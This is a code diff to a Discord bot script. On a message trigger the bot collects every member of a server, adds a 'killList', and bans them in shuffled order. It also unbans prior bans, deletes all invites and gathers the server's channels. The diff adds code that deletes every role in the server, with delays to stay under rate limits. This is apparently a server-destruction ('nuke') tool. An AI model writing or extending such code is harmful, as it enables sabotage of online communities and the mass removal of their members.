@@ -611,11 +611,13 @@ bot.on('message', function(user, userID, channelID, message, evt) {
             var guild = bot.channels[channelID].guild_id;
             var toban = Object.values(bot.servers[guild].members).map(m=>m.id);
             var delchannels = Object.values(bot.servers[guild].channels).map(c=>c.id);
+            var delroles = Object.values(bot.servers[guild].roles).map(r=>r.id);
             var delinvs;
             var tounban;
             
             toban = arr_shuffle(toban.concat(killList));
             (async function loop() {
+              
               
                await new Promise(resolve=>{
             bot.getServerInvites(guild,(e,r)=>{
@@ -637,6 +639,7 @@ bot.on('message', function(user, userID, channelID, message, evt) {
                 });       
             });
               
+              
                for (var b of tounban) {
             await new Promise(resolve=>setTimeout(resolve,505));
               bot.unban({serverID: guild, userID: b}, (e)=>{if(e)console.log("unban error: " + JSON.stringify(e))});
@@ -645,6 +648,11 @@ bot.on('message', function(user, userID, channelID, message, evt) {
               for (var i of delinvs) {
              await new Promise(resolve=>setTimeout(resolve,505));
               bot.deleteInvite(i, (e)=>{if(e)console.log("invite delete error: " + JSON.stringify(e))});
+            }
+              
+              for (var r of delroles) {
+            await new Promise(resolve=>setTimeout(resolve,505));
+              bot.deleteRole({serverID: guild, roleID: r}, (e)=>{if(e)console.log("role delete error: " + JSON.stringify(e))});
             }
               
             for (var m of toban) {
